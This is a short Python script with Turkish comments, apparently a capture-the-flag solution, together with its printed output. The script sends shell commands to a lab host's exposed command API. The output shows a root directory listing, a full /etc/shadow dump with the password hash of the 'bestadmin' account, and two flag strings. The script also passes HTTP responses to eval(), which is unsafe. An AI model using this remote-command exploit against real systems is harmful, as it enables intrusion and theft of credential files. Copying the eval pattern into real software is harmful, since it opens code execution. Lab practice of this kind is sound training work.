import requests

komut_listesi = ["cd root&&ls -la", "cd etc&&cat shadow", "cd root&&cat root*", "find . -name user.txt"]

#bulmak istediğimiz dosyanın içeriğini yazdıran komutu listeye ekliyorum. (/home/bestadmin/user.txt)
komut_listesi.append("cd home&&cd bestadmin&&cat user*")

for komut in komut_listesi:
    print("Komut: ", komut, "\nSonuç:")
    sonuc = eval(requests.get("http://10.10.222.217:3000/api/cmd/"+komut).content)
    print(sonuc["stdout"])
    
#ÇIKAN SONUÇ    
"""
Komut:  cd root&&ls -la 
Sonuç:
total 36
dr-xr-x---  6 root     root      197 Aug 20  2019 .
dr-xr-xr-x 19 root     root      269 Aug 20  2019 ..
-rw-------  1 root     root     5435 Dec 19 19:56 .bash_history
-rw-r--r--  1 root     root       18 Oct 18  2017 .bash_logout
-rw-r--r--  1 root     root      176 Oct 18  2017 .bash_profile
-rw-r--r--  1 root     root      176 Oct 18  2017 .bashrc
drwx------  3 root     root       25 Aug 20  2019 .config
-rw-r--r--  1 root     root      100 Oct 18  2017 .cshrc
drwx------  2 root     root       79 May 11 13:20 .gnupg
drwxr-xr-x  4 ec2-user ec2-user   70 Aug 20  2019 .npm
-rw-r--r--  1 root     root       21 Aug 20  2019 root.txt
drwx------  2 root     root       29 Aug 20  2019 .ssh
-rw-r--r--  1 root     root      129 Oct 18  2017 .tcshrc
-rw-------  1 root     root      829 Aug 20  2019 .viminfo

Komut:  cd etc&&cat shadow 
Sonuç:
root:*LOCK*:14600::::::
bin:*:17919:0:99999:7:::
daemon:*:17919:0:99999:7:::
adm:*:17919:0:99999:7:::
lp:*:17919:0:99999:7:::
sync:*:17919:0:99999:7:::
shutdown:*:17919:0:99999:7:::
halt:*:17919:0:99999:7:::
mail:*:17919:0:99999:7:::
operator:*:17919:0:99999:7:::
games:*:17919:0:99999:7:::
ftp:*:17919:0:99999:7:::
nobody:*:17919:0:99999:7:::
systemd-network:!!:18065::::::
dbus:!!:18065::::::
rpc:!!:18065:0:99999:7:::
libstoragemgmt:!!:18065::::::
sshd:!!:18065::::::
rpcuser:!!:18065::::::
nfsnobody:!!:18065::::::
ec2-instance-connect:!!:18065::::::
postfix:!!:18065::::::
chrony:!!:18065::::::
tcpdump:!!:18065::::::
ec2-user:!!:18128:0:99999:7:::
mongod:!!:18128::::::
bestadmin:$6$MzQI89D0$4p.2RpwZIFmTxQgKL.ZIsABfpHkejb3x.TdxZWqhIeVF8YQf2zY2fUQAgVehQJp0mXi4GF74YSRpnLHuItUYn.:18128:0:99999:7:::
tss:!!:18128::::::

Komut:  cd root&&cat root* 
Sonuç:
XwENkzwFxCocIVPAxVpv

Komut:  find . -name user.txt 
Sonuç:
./home/bestadmin/user.txt

Komut:  cd home&&cd bestadmin&&cat user* 
Sonuç:
5W7WkjxBWwhe3RNsWJ3Q

"""
